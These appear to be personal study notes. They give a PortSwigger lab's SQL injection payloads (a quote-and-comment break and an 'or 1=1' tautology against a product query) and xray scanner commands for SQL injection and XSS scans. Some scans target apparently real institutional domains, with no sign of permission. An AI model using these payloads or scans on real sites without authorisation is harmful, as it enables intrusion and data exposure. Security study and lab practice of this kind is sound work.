# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```

 Soln--> SELECT * FROM products WHERE category = ' '  ' --+ AND released = 1

 SELECT * FROM products WHERE category = ' '  or 1=1  ' --+ AND released = 1


https://portswigger-cdn.net/burp/releases/download?product=pro&version=2024.10.3&type=Jar









# XRAY 

./xray_linux_amd64 webscan --url https://bwed.ac.in/ --html-output vuln.html
This provides more comprehensive crawling than --basic-crawler.

Specify Custom Plugins: To focus on specific vulnerability types:

bash
Copy code
./xray_linux_amd64 webscan --plugin sql-injection,xss --url https://biteac.in/ --html-output vuln.html
Log Output: Enable logging for better debugging:

bash
Copy code
./xray_linux_amd64 webscan --basic-crawler https://juice-shop.herokuapp.com/ --html-output vuln.html
